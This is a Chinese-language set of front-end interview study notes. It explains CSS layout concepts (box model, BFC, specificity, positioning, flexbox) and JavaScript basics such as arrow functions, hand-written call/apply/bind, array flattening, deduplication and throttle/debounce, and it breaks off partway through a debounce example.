# CSS

## transition 和 animation 的区别

> transition关注的是CSS property的变化，property值和时间的关系是一个三次贝塞尔曲线。
> 
> animation作用于元素本身而不是样式属性，可以使用关键帧的概念，应该说可以实现更自由的动画效果。
> 
> CSS transition 强调的是单一动画属性的过度效果,其过程是简单的，由开始到结束的过程，中间不存在可能的动画转折，只有0到1，比喻：渐隐，渐显;
> 
> CSS animation 强调的是多种动画属性的结合，按时间轴线出现周折性动画变换的动画过程，其过程是复杂的，由开始——>结束的过程中，存在可能的动画转折，其过程可能是开始—0—1—2—3>结束的过程
> 
> 综合来说：CSS animation可以包括CSS transition 的动画形式

## 如何让去除 inline-block 元素间间距

初始代码

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="../css/change.css">
</head>
<body>

    <div class="box"></div>
    <div class="box"></div>
    <div class="box"></div>

</body>
</html>
```

> 方法一：（移除标签间的空格）

```html
<!-- 移除标签间的空格 --> 
<div class="box"></div>
<div class="box"></div>
<div class="box"></div>

<div class="box"></div><div class="box"></div><div class="box"></div>
```

> 方法二：（使用margin负值）

```css
* {
  padding: 0;
  margin: 0;
}

.box {
  /* 省略的代码 */
  margin-right: -5px;
}
```

> 方法三：（给==父元素节点==添加 font-size:0;）

```css
body {
  font-size: 0;
}
```

> 方法四：（给==父元素节点==添加 letter-spacing 的负值）

```css
body {
  letter-spacing: -5px;
}
```

> 方法五：（给==父元素节点==添加 word-spacing 的负值）

```css
body {
  word-spacing: -5px;
}
```

## **如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）**

因为一般的屏幕刷新率为60Hz，指在1秒屏幕刷新60次，所以最短的动画时间间隔为1/60*1000ms=16.7ms

## 使用 rem 布局的优缺点？

```bash
优点：
在屏幕分辨率千差万别的时代，只要将rem与屏幕分辨率关联起来就可以实现页面的整体缩放，使得在设备上的展现都统一起来了。
而且现在浏览器基本都已经支持rem了，兼容性也非常的好。

缺点：
（1）在奇葩的dpr设备上表现效果不太好，比如一些华为的高端机型用rem布局会出现错乱。
（2）使用iframe引用也会出现问题。
（3）rem在多屏幕尺寸适配上与当前两大平台的设计哲学不一致。即大屏的出现到底是为了看得又大又清楚，还是为了看的更多的问
题。
```

## 画一条0.5px的线

```bash
# PC端
采用transform:scale(0.5)的方式

采用border-image的方式

# 移端开发
<meta name="viewport" content="width=device-width, initial-scale=0.5">
```

## margin:auto 的填充规则？

```bash
margin的'auto'可不是摆设，是具有强烈的计算意味的关键字，用来计算元素对应方向应该获得的剩余间距大小。但是触发margin:auto计算有一个前提条件，就是width或height为auto时，元素是具有对应方向的自动填充特性的。

（1）如果一侧定值，一侧auto，则auto为剩余空间大小。
（2）如果两侧均是auto，则平分剩余空间。
```

## letter-spacing 与字符间距？

```bash
letter-spacing可以用来控制字符之间的间距，这里说的“字符”包括英文字母、汉字以及空格等。

letter-spacing具有以下一些特性。

（1）继承性。
（2）默认值是normal而不是0。虽然说正常情况下，normal的计算值就是0，但两者还是有差别的，在有些场景下，letter-spacing会调整normal的计算值以实现更好的版面布局。
（3）支持负值，且值足够大的时候，会让字符形成重叠，甚至反向排列。
（4）和text-indent属性一样，无论值多大或多小，第一行一定会保留至少一个字符。
（5）支持小数值，即使0.1px也是支持的。
（6）暂不支持百分比值。
```

## word-spacing 与单词间距？

```bash
letter-spacing作用于所有字符，但word-spacing仅作用于空格字符。换句话说，word-spacing的作用就是增加空格的间隙
宽度。
```

## white-space 与换行和空格的控制？

```bash
white-space属性声明了如何处理元素内的空白字符，这类空白字符包括Space（空格）键、Enter（回车）键、Tab（制表符）
键产生的空白。因此，white-space可以决定图文内容是否在一行显示（回车空格是否生效），是否显示大段连续空白（空格是否
生效）等。

其属性值包括下面这些。
•normal：合并空白字符和换行符。
•pre：空白字符不合并，并且内容只在有换行符的地方换行。
•nowrap：该值和normal一样会合并空白字符，但不允许文本环绕。
•pre-wrap：空白字符不合并，并且内容只在有换行符的地方换行，同时允许文本环绕。
•pre-line：合并空白字符，但只在有换行符的地方换行，允许文本环绕。
```

## 关于css动画tansform：translateZ(100px) 失效

给==**父类**==加`perspective`属性

```css
.father {
      perspective: 200px;
}
```

## **说一下盒子模型**

<mark>盒子的组成: content、padding、border、margin</mark>

盒子模型分两种：

1. 标准盒子模型

2. 替代（IE）盒子模型

两种盒子模型的区别:

* 对于标准盒子模型: **width和height只包含content**
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h186ougnxij20k20bdjs8.jpg)

* 对于替代盒子模型: **width和height包含content、padding、border**，而此时设置padding和border的值，浏览器会通过打压content的大小，来设置padding和border，<u>当padding或border的值大于设置的width和height时，那此时的盒子会被撑破，超出一开始设置的width和height</u>
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h186po2hfpj20l60b5mxz.jpg)

更多内容：[盒模型 - 学习 Web 开发 | MDN](https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/The_box_model)

## box-sizing的border-box和content-box的区别

border-box将盒子设置为替代盒子模型，而content-box将盒子设置为标准盒子模型（默认）

## CSS 块元素与行内元素

### 块元素

```html
<h1>...</h1>  标题一级

<h2>...</h2>  标题二级

<h3>...</h3>  标题三级

<h4>...</h4>  标题四级

<h5>...</h5>  标题五级

<h6>...</h6>  标题六级

<hr>  水平分割线

<p>...</p>  段落

<pre>...</pre>  预格式化

<blockquote>...</blockquote>  段落缩进   前后5个字符

<marquee>...</marquee>  滚动文本

<ul>...</ul>  无序列表

<ol>...</ol>  有序列表

<dl>...</dl>  定义列表

<table>...</table>  表格

<form>...</form>  表单

<div>...</div>
```

### 行内元素

```html
<span>...</span>

<a>...</a>  链接

<br>  换行

<b>...</b>  加粗

<strong>...</strong>  加粗

<img >  图片

<sup>...</sup>  上标

<sub>...</sub>  下标

<i>...</i>  斜体

<em>...</em>  斜体

<del>...</del>  删除线

<u>...</u>  下划线

<input>...</input>  文本框

<textarea>...</textarea>  多行文本

<select>...</select>  下拉列表
```

## 行内元素与块元素、行内块元素的区别

块元素:

1. 总是从新的一行开始,即各个块元素独占一行

2. 高度、宽度、margin及padding都是可控的，设置有效，有边距效果；

3. 宽度没有设置时,默认100%

4. 块级元素中可以包含块级元素和行内元素

行内元素:

1. 行内元素会和其他行内元素在一条水平线上排列

2. 设置宽高、以及margin和padding的上下无效 (注意: <mark>padding的上下设置后可以显示,但是在布局中无效</mark>)

3. 根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素; a 链接里面不能再放链接

行内块元素:

* 结合了块元素和行内元素的特点
1. 和相邻行内元素在同一行, 但是之间会有空白缝隙。(如何去掉间隙,可以查看上面的问题)

2. 默认宽度是他本身内容的宽度。

3. 宽度、高度、行高、外边距以及内边距都可以手动设置。

## 哪些标签有默认margin（且不为0）

> body、h1、p、dl、ul、ol标签

## 说一说BFC

### What is the BFC

简单来说就是，`BFC`是一个完全独立的空间（布局环境），让空间里的子元素不会影响到外面的布局。那么怎么使用`BFC`呢，`BFC`可以看做是一个`CSS`元素属性

### 如何触发BFC

这里简单列举几个触发`BFC`使用的`CSS`属性

- overflow: hidden
- display: inline-block
- position: absolute
- position: fixed
- display: table-cell
- display: flex

### BFC的规则

- `BFC`就是一个块级元素，块级元素会在垂直方向一个接一个的排列
- `BFC`就是页面中的一个隔离的独立容器，容器里的标签不会影响到外部标签
- 垂直方向的距离由margin决定， 属于同一个`BFC`的两个相邻的标签外边距会发生重叠
- 计算`BFC`的高度时，浮动元素也参与计算

### BFC解决的问题

> 解决高度塌陷问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>高度塌陷</title>
    <style>
        body {
            margin: 0;
        }
        .box {
            margin: 100px;
            width: 100px;
            height: 100px;
            background: red;
            float: left;
        }
        .container {
            background: #000;
            /* 
                - 触发BFC，解决高度塌陷问题
                - 触发以下任意一个属性都可以
            */
            /* overflow: hidden; */
            /* display: inline-block; */
            /* position: absolute; */
            /* position: fixed; */
            /* display: table-cell; */
            /* display: flex; */
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box"></div>
        <div class="box"></div>
    </div>
</body>
</html>
```

> 解决Margin边距重叠问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            margin: 0;
        }
        .box {
            width: 100px;
            height: 100px;
            margin: 10px;
            background-color: black;
        }
        .bfc {
            /* 
                - 触发BFC，解决高度塌陷问题
                - 触发以下任意一个属性都可以
            */
            /* display: inline-block; */
            /* position: absolute; */
            /* position: fixed; */
        }
    </style>
</head>
<body>

    <div class="box"></div>
    <!-- 
        另外一种方式，为元素包裹一个盒子形成一个
        完全独立的空间，做到里面元素不受外面布局影响 
        - 添加一个p标签
    -->
    <!-- <p> -->
        <div class="box bfc"></div>
    <!-- </p> -->

</body>
</html>
```

> 解决两栏布局问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>两栏布局</title>
    <style>
        div {
            width: 200px;
            height: 100px;
            border: 1px solid red;
        }

        .bfc {
            /* 
                - 触发BFC，解决高度塌陷问题
                - 触发以下任意一个属性都可以
            */
            /* overflow: hidden; */
            /* display: inline-block; */
            /* display: table-cell; */
            /* display: flex; */
        }
    </style>
</head>

<body>
    <div style="float: left;">
        两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局两栏布局
    </div>
    <div style="width: 300px;" class="bfc">
        我是蛙人，如有帮助请点个赞叭，如有帮助请点个赞叭，如有帮助请点个赞叭，如有帮助请点个赞叭，如有帮助请点个赞叭，如有帮助请点个赞叭
    </div>
</body>

</html>
```

## CSS权重 ( CSS优先级 )

> `先说继承性, 再谈选择器优先级`

**CSS 优先规则1：** 最近的祖先样式比其他祖先样式优先级高。

**CSS 优先规则2：**"直接样式" (指直接作用在自身的样式,而非继承而来的) 比"祖先样式"优先级高。

> 选择器优先级

!important > 行内样式(`1000`) > id选择器(`100`) > 类选择器 | 伪类选择器 | 属性选择器(`10`) > 标签选择器｜伪元素选择器 (`1`)

> 错误说法
> 
> 11 个类选择器组成的选择器和一个由 1 个 ID 选择器组成的选择器指向同一个标签, 最后应用11个类选择器对应的样式 (❌)

解释:

在学习过程中，你可能发现给选择器加权值的说法，即 ID 选择器权值为 100，类选择器权值为 10，标签选择器权值为 1，当一个选择器由多个 ID 选择器、类选择器或标签选择器组成时，则将所有权值相加，然后再比较权值。这种说法其实是有问题的。比如一个由 11 个类选择器组成的选择器和一个由 1 个 ID 选择器组成的选择器指向同一个标签，按理说 110 > 100，应该应用前者的样式，然而事实是应用后者的样式。错误的原因是：**权重的进制是并不是十进制，CSS 权重进制在 IE6 为 256，后来扩大到了 65536，现代浏览器则采用更大的数量。**。还是拿刚刚的例子说明。11 个类选择器组成的选择器的总权值为 110，但因为 11 个均为类选择器，所以其实总权值最多不能超过 100， 你可以理解为 99.99，所以最终应用后者样式。

参考: [CSS 样式优先级 | 菜鸟教程](https://www.runoob.com/w3cnote/css-style-priority.html)

## `+`和`~`

* 相邻兄弟选择器（'+'）: 选择`紧接`在另`一个`元素后的元素，而且二者有`相同的父元素`。

* 兄弟选择器（'~'）: 选择在某元素`之后`的`所有兄弟`元素，`不一定要紧跟`在后面，但必须得是`相同父元素`.

## height、min-height、max-height

1、min-height和height同时使用，谁大听谁的

2、max-height和height同时使用，谁小听谁的

3、height、min-heigth和max-height同时使用，分为以下情况

- height > max-height > min-height 元素高度：max-height

- height > min-height > max-height 元素高度：min-height

- max-height > height > min-height 元素高度：height

- max-height > min-height > height 元素高度：min-height

- min-height > height > max-height 元素高度：min-height

- min-height > max-height > height 元素高度：min-height

## CSS属性继承

所有元素可继承：visibility和cursor。
内联元素可继承：letter-spacing、word-spacing、white-space、line-height、color、font、font-family、font-size、font-style、font-variant、font-weight、text-decoration、text-transform、direction。
终端块状元素可继承：text-indent和text-align。
列表元素可继承：list-style、list-style-type、list-style-position、list-style-image。
原文链接:  https://blog.csdn.net/drdongshiye/article/details/77619680

## CSS定位详解

`position`属性有五个值, 分别是`static、relative、absolute、fixed、sticky`

最后一个`sticky`是浏览器2017年才支持的

### static

`static`是`position`的默认属性值, 此时设置`top、left、right、bottom`是没有效果的

### relative、absolute、fixed

`对于这三个属性值来说都是一个思想, 都是相对于谁来进行定位, 只不过是参考对象不同`

> relative

首先`relative`是相对于元素自身的`static`状态进行位置偏移的, 通过设置`top、left、right、bottom`来对其设置偏移

注意: `relative`没有脱离文档流, 所以即使发生偏移, 也会保留其原来的元素位置

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e4fd2oj3j21c00u0dkl.jpg)

> absolute

而对于`absolute`, 一般是相对于父元素进行偏移, 如果父元素是`static`定位, 则设置`absolute`的当前元素的参考点就会变成`祖先元素`, 而且`absolute`也需要搭配`top、left、right、bottom`

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e43389vuj21c00u0q7z.jpg)

注意下面这张图!!

```css
body {
  margin: 0;
  height: 2000px;
}
/*
  <div id="grandfather">
    <div id="father">  
      <div id="son">子元素</div>  
    </div>
  </div>
*/
#grandfather {
  width: 300px;
  height: 300px;
  background: skyblue;

  margin-top: 100px;
  margin-left: 100px;

  position: relative;  /* 祖先元素为 relative 定位 */
}
#father {
  width: 200px;
  height: 200px;
  background: greenyellow;

  position: static;  /* 父元素为 static 默认定位 */
}
#son {
  width: 100px;
  height: 100px;
  background: orange;

  /* 此时子元素是相对于 祖先元素 进行定位, 而不是相对于 html 定位 */
  position: absolute;  
  top: 20px;
  left: 20px;
}
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e5fjy0kjj21c00u0afe.jpg)

注意: `absolute`定位使该元素脱离文档流, 在原来的布局中所占空间为零

> fixed

该属性是相对于视窗 (viewport) 来进行偏移, 所以当我们滚动页面时, 会一直定位在当前适口的某一个位置, 不会随页面滚动而移动

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e47bgkj7j21c00u0gqe.jpg)

但如果你设置此时的`left`为一个负值, 自然当前的`#child`会向左边移动, 甚至消失在视图中

注意: `fixed`定位也使该元素脱离文档流, 在原来的布局中所占空间为零

> 所以`relative、absolute、fixed`中只有`relative`定位在发生偏移时,没有脱离原来的布局

### sticky

而`sticky`相当于是`relative`和`fixed`的结合, 当不滚动页面时, `sticky`定位会像`relative`一样进行定位, 当页面滚动时, `sticky`定位会和`fixed`定位一样固定在视窗中某一个位置(但是相当于 `fixed`时候存在一个问题, 看后文注意点)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e4yh2kshj21c00u0af3.jpg)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e4zzfduej21c00u0aev.jpg)

> 这里有一点值得注意

就是当页面进行滚动时, `sticky`就会像`fixed`定位一样固定, 但是`sticky`的固定并不是一定就相对于视窗的, 而是相对于外层的父元素而言, 当外层的父元素滚动出页面, 则此时设置`sticky`定位的子元素也会随着父元素一并带离页面

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>复习CSS定位</title>
  <style>
    body {
      margin: 0;
      height: 2000px;
    }
    .box {
      width: 500px;
      height: 500px;
      background-color: pink;
    }
    .container {
      width: 100px;
      height: 100px;
      background-color: coral;

      position: sticky;
      top: 60px;
      left: 60px;
    }
  </style>
</head>
<body>
  <div class="box">
    <div class="container"></div>
  </div>
</body>
</html>
```

执行效果:

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1fxcu277rj21c00u0gps.jpg)

参考: [CSS 定位详解 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2019/11/css-position.html)

## Flex 布局

### Flex 布局概念

Flex布局是2009年W3C组织提出的一种不同于传统布局的布局方式, 被成为 “弹性” 布局.

该布局存在两个轴作为基本布局依据, 分别是沿着水平方向上的主轴(`默认为水平方向`), 和垂直于主轴的交叉轴,  `Flex布局中的每一个元素默认沿主轴排列`.

### 容器属性

> 定义在外层容器上的属性

```bash
1. flex-direction
2. justify-content
3. flex-wrap
4. flex-flow
5. align-items
6. align-content
```

> flex-direction

`flex-direction`属性决定主轴的方向（也是其中各个元素的排列方向）

> justify-content

设置元素在主轴方向上的排列形式

```css
.box {
  justify-content: flex-start | flex-end | center | space-between | space-around;
}
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e7b7e4f6j20hp0l7wf6.jpg)

> flex-wrap

对于这个属性, 对于其属性值`wrap | nowrap`顾名思义就是设置子元素换行和不换行.

重点提一下`wrap-reverse`效果, 是在换行的基础下, 把第一行设置在下面

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e76mnou6j21c00u0af8.jpg)

这里需要注意一点, 就是如果`Flex`容器设置了高度 , 并且高于其中每列元素高度相加的和, 那么换行的元素就不会紧贴这前一行的元素了, 而是随着容器高度的变大, 间隙也增大

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e9waelfzj21c00u0q8m.jpg)

> flex-flow

`flex-flow`是`flex-direction`和`flex-wrap`的简写形式, 默认为`row nowrap`

```css
.box {
  flex-flow: <flex-direction> || <flex-wrap>;
}
```

> align-items

设置元素在交叉轴方向上的排列形式

```css
.box {
  align-items: flex-start | flex-end | center | baseline | stretch;
}
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e7fkfn2aj20h50lu752.jpg)

- `flex-start`：交叉轴的起点对齐。
- `flex-end`：交叉轴的终点对齐。
- `center`：交叉轴的中点对齐。
- `baseline`: `以其中的元素的第一行文字的基线对齐。`
- `stretch`（默认值）：如果其中的元素`未设置高度或设为auto`，将占满整个容器的高度。如果设置了高度, 则效果同`flex-start`

> align-content

`align-content`定义了多根轴线的排列方式, 如果其中的元素为一根轴线则该属性不起效果

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1e9i17we3j20h80luq41.jpg)

注意: 注意下这里换行时,  容器高度所产生的间隙随容器高度而变化!

> 假如在弹性布局中`align-items`和`align-content`都定义时, 在交叉轴上的布局应该听谁的?

最主要的一点就是看是否定义`flex-wrap`, 定义该该属性后, `align-content`起作用, 否则就是`align-items`起作用

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>复习巩固Flex布局</title>
  <style>
    body {
      margin: 0;
    }
    .container {
      height: 300px;
      background-color: blanchedalmond;
      /* 
        由于定义了 flex-wrap: wrap; 所以
        此时 align-content: flex-start; 起作用
        即使此时的子元素在视觉上并为产生多行的效果
      */
      display: flex;
      align-items: center;   
      justify-content: space-around;
      flex-wrap: wrap;
      align-content: flex-start;
    }
    .container .item {
      width: 100px;
      height: 100px;
      background-color: pink;
      font-size: 30px;
      border: 1px solid orangered;
    }
  </style>
</head>

<body>  
  <div class="container">
    <div class="item">1</div>
    <div class="item">2</div>
    <div class="item">3</div>
  </div>
</body>

</html>
```

### 容器中元素的属性

```bash
1. order
2. flex-grow
3. flex-shrink
4. flex-basis
5. flex
6. align-self
```

> order

`order`属性定义元素的排列顺序. 数值越小, 排列越靠前, 默认为 0

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1eagqluzrj21c00u044n.jpg)

> flex-grow

`flex-grow`定义元素的放大比例. 是基于每行的`剩余空间`进行分配, 默认为 0, 即如果存在剩余空间, 也不分配.

```css
.item {
  flex-grow: <number>; /* default 0 */
}
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1eawu5vnsj21c00u0gr2.jpg)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1eay9vbmaj21c00u0tew.jpg)

> flex-shrink

该属性定义了元素的`缩小`比例, 默认为1, 如果空间充足, 则不起作用. 单行产生压缩时, 将压缩部分按比例分配给子元素进行压缩.(一开始所有子元素的压缩宽度相同)

```css
.item {
  flex-shrink: <number>; /* default 1 */
}
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1eqgg820hj21c00u0q9n.jpg)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1eqhzzg3ej21c00u0q9k.jpg)

图中的绿色块没有缩放, 因为设置的`flex-shrink`为0, 而粉色的缩放内容是橙色的两倍, 因为粉色的`flex-shrink`设置为2, 橙色的为1. 

> flex-basis

该属性定义了在分配多余空间`之前`, 元素占据的主轴空间. 浏览器根据这个属性进行计算, 判断是否还有多余空间. 默认值为auto

```css
.item {
  flex-basis: <length> | auto; /* default auto */
}
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1er4iofyvj21c00u044q.jpg)

设置元素的固定宽度为`170px`

如果设置百分比的值, 则相对于容器的宽度设置的百分

- 如果设置子元素的`flex-basis`宽度就导致单行元素产生压缩, 而此时的`flex-shrink`为默认值1, 则压缩时, 是按照设置的`flex-basis`比例进行分配压缩

```html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>复习巩固Flex布局</title>
  <style>
    body {
      margin: 0;
    }
    .container {
      height: 300px;
      background-color: blanchedalmond;

      display: flex;
      align-items: center;   
      justify-content: space-around;
    }
    .container .item {
      width: 150px;
      height: 150px;
      background-color: pink;
      font-size: 30px;
    }
    /* 
      此时
      第一个元素压缩部分: 第二个元素压缩部分 = 300 : 200 = 3 : 2
    */
    .container .item:nth-child(1) {
      flex: 0 1 300px;
    }
    .container .item:nth-child(2) {
      flex: 0 1 200px;   
    }
    .container .item:nth-child(3) {
      flex: 0 1 300px;
    }
  </style>
</head>

<body>  
  <div class="container">
    <div class="item">1</div>
    <div class="item">2</div>
    <div class="item">3</div>
  </div>
</body>
</html>
```

> flex

`flex`属性是`flex-grow`, `flex-shrink` 和 `flex-basis`的简写，默认值为`0 1 auto`。后两个属性可选。

```css
.item {
  flex: none | [ <'flex-grow'> <'flex-shrink'>? || <'flex-basis'> ]
}
```

该属性有两个快捷值：`auto` (`1 1 auto`) 和 none (`0 0 auto`)。

建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值.

> align-self

默认值为auto, 会为当前元素覆盖掉设置在`Flex`容器上的`align-items`属性

```css
.item {
  align-self: auto | flex-start | flex-end | center | baseline | stretch;
}
```

比`align-items`属性多了一个auto值, 其他同`align-items`

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1es2k4owaj21c00u0dl8.jpg)

参考: [Flex 布局教程：语法篇 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html)

## Grid 布局



# JS

## 箭头函数与普通函数的区别

1. 箭头函数是匿名函数，不能作为构造函数，故不可使用`new`
   
   ```js
   let fn = () => {
     console.log(123);
   }
   fn();  // 123
   
   let bar = new fn();  // Uncaught TypeError: fn is not a constructor
   ```

2. 箭头函数不绑定`arguments`，取而代之用`rest`参数解决
   
   ```js
   let fn = () => {
     console.log(arguments);
   }
   fn(11, 22);  //  Uncaught ReferenceError: arguments is not defined
   
   let bar = (...argsArray) => {
     console.log(argsArray);
   }
   bar(33, 44);  // [33, 44]
   ```

3. 箭头函数不绑定`this`，会捕获其所在的上下文的`this`值，作为自己的值
   
   ```js
   let person = {
     name: 'leo',
     skill: function() {
       let fn = () => {
         console.log(this);
       }
       fn();
     },
     hobby: () => {
       console.log(this);
     }
   };
   person.skill();  // {name: "leo", skill: ƒ}
   /* 
     因为person本身是没有作用域的，故
     箭头函数要往更外层寻找，所以找到
     Window对象
   */
   person.hobby();  // Window对象
   ```

4. 箭头函数没有原型属性`prototype`
   
   ```js
   let fn = () => {
     return 1;
   }
   
   console.log(fn.prototype);  // undefined
   ```

5. 箭头函数不能当做`Generator`函数，不能使用`yield`关键字

## 手动实现call、apply、bind（如何改变普通函数中的this指向）

```js
/* 
  模拟实现call
*/
Function.prototype.myCall = function(obj){
  // 这里就是传入的第一个参数
  let curObj = obj ? obj : window;
  // this是获取调用函数（对象）的引用
  // 存储函数的引用到curObj对象中
  curObj.fn = this;
  // 存储除开第一个参数的数据作为参数数组
  let args = [...arguments].slice(1);
  // 调用对象方法
  let result = curObj.fn(...args);
  // 删除对象属性（方法）
  delete curObj.fn;
  return result;
}

/* 
  模拟实现apply
*/
Function.prototype.myApply = function(obj) {
  let curObj = obj ? obj : window;
  curObj.fn = this;
  let params = arguments[1] || []; 
  let result = curObj.fn(...params);
  delete curObj.fn;
  return result;
}

/* 
  模拟实现bind
*/
Function.prototype.myBind = function(obj) {
  let curObj = obj ? obj : window;
  curObj.fn = this;
  let params = [...arguments].slice(1); 
  return function() {
    let afterParams = [...arguments];
    let resParams = params.concat(afterParams);
    let result = curObj.fn(...resParams);
    delete curObj.fn;
    return result;
  };
}

function foo(){
  console.log(this);
  return 'stronger heart';
}

foo();  // Window
foo.call({name: 'leo'});  // {name: "leo"}
foo.myCall({name: 'great man'}, 'man', 'cool')  // {name: "great man"}
foo.myApply({name: 'handsome boy'}, ['code', 'dance'])  // {name: "handsome boy"}
let res = foo.myBind({name: 'cool guys'}, 1, 2)('boy');  // {name: "cool guys"}
console.log(res);  // stronger heart
```

## `==`和`===`的区别

`==`只是比较值（会做一个隐式的类型转换），而`===`会比较值与类型（只有两个条件都相同，才会判断为true）

```js
var a = "2";
if(a == 2) {
  console.log('这就是==');
  console.log(typeof a);
}
if(a == "2") {
  console.log('这就是==, too');
  console.log(typeof a);
}
if(a === 2) {
  console.log('这就是全等');
}

// 这就是==
// string
// 这就是==, too
// string
```

## 手动实现扁平化（JS实现数组扁平化）

```js
// 手写扁平化
let arr = [1,2,[3,[4,[5,6]]]];

function myFlat(array) {
    let result = [];
    for(let ele of array) {
        if(typeof ele != 'object') {
            result.push(ele);
        }else if(Array.isArray(ele)) {  // 判断元素是否是数组
            // 递归调用
            let arr = myFlat(ele);
            result.push(...arr);
        }
    }
    return result;
}
console.log(myFlat(arr)); // [1, 2, 3, 4, 5, 6]
```

```js
let arr = [1,2,[3,[4,[5,6]]]];
// 要求将数组扁平化处理 [1,2,3,4,5,6]

// 方式一: Array.flat(参数)  参数：深度
console.log(arr.flat(1));   // [1, 2, 3, Array(2)]
console.log(arr.flat(2));   // [1, 2, 3, 4, Array(2)]
console.log(arr.flat(3));   // [1,2,3,4,5,6]
console.log(arr.flat(Infinity));   // [1,2,3,4,5,6]

// 方式二：reduce() + 递归调用
function flatFn(arr) {
  return arr.reduce((pre,val) => {
    return pre.concat(Array.isArray(val) ? flatFn(val) : val);
  },[])
}
console.log(flatFn(arr));   // [1,2,3,4,5,6]

// 方式三  数组转成字符串，再将字符串转为数组
function flatFn2(arr) {
  return arr.join(',').split(',').map(val => {
    // return Number(val);
    return parseInt(val);
  })
}
console.log(flatFn2(arr));   // [1,2,3,4,5,6]

// 方式四  扩展运算符
function flatFn3(arr) {
  while(arr.some(val => Array.isArray(val))) {
    arr = [].concat(...arr);
  }
  return arr;
}
console.log(flatFn3(arr));  // [1,2,3,4,5,6]
```

## 不用promise.all，如何判断三个请求都执行完成（只使用Promise）

查看下面的手写  `Promise.all`

## 数组去重

### Set

```js
let arr = [1, 1, 2, 'leo', 'leo', true, true];
let res = Array.from(new Set(arr));
console.log(res);  // [1, 2, 'leo', true]
```

### Map

```js
let arr = [1, 1, 2, 'leo', 'leo', true, true, 2];
let res = [];
let map = new Map();
for (let i = 0; i < arr.length; i++) {
    if(map.has(arr[i])) {
        map.set(arr[i], true);
    }else {
        map.set(arr[i], false);
        res.push(arr[i]);
    }
}
console.log(res);  // [1, 2, 'leo', true]
```

### indexOf

```js
let arr = [1, 1, 2, 'leo', 'leo', true, true, 2];
let res = [];
for(let i = 0; i < arr.length; i++) {
    if(res.indexOf(arr[i]) === -1) {
        res.push(arr[i]);
    }
}
console.log(res);  // [1, 2, 'leo', true]
```

### sort

```js
let arr = [1, 1, 2, 'leo', 'leo', true, true, 2];
arr.sort();  // [1, 1, 2, 2, 'leo', 'leo', true, true]
let res = [arr[0]];
for(let i = 1; i < arr.length; i++) {
    if(arr[i] !== arr[i - 1]) {
        res.push(arr[i]);
    }
}
console.log(res);  // [1, 2, 'leo', true]
```

## 函数的节流和防抖

### 函数的节流

> 控制高频事件执行次数，将执行次数稀释

```js
var throttle = function(fn, interval) {
    // 记录函数引用
    let _self = fn;
    // 设定定时器
    let timer = null;

    return function() {
        var args = arguments;

        if(timer) {
            return false;
        }
        timer = setTimeout(() => {
            clearTimeout(timer);
            timer = null;
            fn.apply(this, args);
        }, interval || 500)
    }
}

window.onresize = throttle(function() {
    console.log(1);
},2000)
```

通过改变窗口大小，我们可以发现`1`不会特别一直持续打印，而是在`2000ms`之内才会执行一次

通过节流的代码，我们可以减少浏览器对单一事件的响应次数，提高工效

### 函数的防抖

> 用户触发事件频繁，==只要最后一次==

```js
let input = document.querySelector('input');
let inputEvent = function(fn, interval) {
    // 设定计时器
    let timer = null;
    return function() {
        // 前面有就清掉（清除前一次的输入计时器）
        if(timer !== null) {
              // 此时销毁了timer指针指向的计时器，而timer本身的标记号还没消除
            clearTimeout(timer);
        }
            // timer此时被赋值新的标记号和指向新建的计时器
        timer = setTimeout(() => {
            // 实现业务代码（注意这里的this，是需要传入的）
            fn.call(this);
        },interval || 1000)
    }
